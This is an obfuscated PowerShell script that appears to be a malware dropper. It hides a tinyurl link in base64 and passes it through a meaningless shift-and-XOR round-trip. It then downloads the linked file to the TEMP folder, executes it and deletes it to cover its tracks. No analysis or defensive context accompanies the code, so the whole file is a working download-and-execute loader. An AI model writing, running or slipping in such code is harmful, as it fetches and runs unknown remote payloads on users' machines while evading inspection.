function f1 {
    param (
        [int]$v1
    )
    return -join ((65..90) | Get-Random -Count $v1 | ForEach-Object { [char]$_ })
}

$e1 = "aHR0cHM6Ly90aW55dXJsLmNvbS9sb2xvbG9sbzIzMjIyMg=="

function f2 {
    param (
        [string]$v2
    )
    try {
        return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($v2))
    } catch {
        Write-Error "Failed : $_"
        return $null
    }
}

$d1 = f2 -v2 $e1

function f3 {
    param (
        [string]$v3
    )
    try {
        $o1 = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($v3))
        $c1 = New-Object System.Net.WebClient
        $c1.DownloadFile($v3, $o1)
        return $o1
    } catch {
        Write-Error "Failed : $_"
        return $null
    }
}

function f4 {
    param (
        [string]$v4
    )
    try {
        Start-Process -FilePath $v4 -NoNewWindow -Wait
    } catch {
        Write-Error "Failed : $_"
    }
}

function f5 {
    param (
        [string]$v5,
        [int]$s1
    )
    try {
        $r1 = ""
        foreach ($c1 in $v5.ToCharArray()) {
            $r1 += [char](([byte]$c1 + $s1) -band 0xFF)
        }
        return $r1
    } catch {
        Write-Error "Failed : $_"
        return $null
    }
}

function f6 {
    param (
        [string]$v6,
        [int]$k1
    )
    try {
        $r2 = ""
        foreach ($c2 in $v6.ToCharArray()) {
            $r2 += [char](([byte]$c2 -bxor $k1) -band 0xFF)
        }
        return $r2
    } catch {
        Write-Error "Failed : $_"
        return $null
    }
}

$o2 = f5 -v5 $d1 -s1 1
$o2 = f6 -v6 $o2 -k1 5

$d2 = f6 -v6 $o2 -k1 5
$d2 = f5 -v5 $d2 -s1 -1

$p1 = f3 -v3 $d2

if ($p1) {
    f4 -v4 $p1
    Remove-Item -Path $p1
}
